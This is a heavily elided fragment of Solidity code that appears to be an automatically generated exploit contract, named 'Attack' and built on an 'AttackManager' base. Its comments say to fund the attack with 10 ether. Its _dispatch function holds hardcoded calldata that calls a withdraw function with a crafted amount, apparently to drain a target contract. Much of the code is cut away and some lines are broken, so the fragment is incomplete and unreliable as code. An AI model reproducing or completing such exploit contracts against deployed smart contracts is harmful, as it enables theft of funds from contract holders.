 ...
 * parameter. Make sure to send at least 10 ether and 0 wei to the attack
 ...
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x8ac7230489e80000 wei
 *
 */
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                ...
                input: { uint(27175365750026548),  }
 
                 */
                bytes memory data = bytes(hex"2e1a7d4d00000000000000000000000000000000000000000000000000608bd9e62bf134");
                uint value = 0x0;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x8ac7230489e80000; /* equals 10 ether and 0 wei */
    uint constant INITIAL_ETHER = 0x8ac7230489e80000;
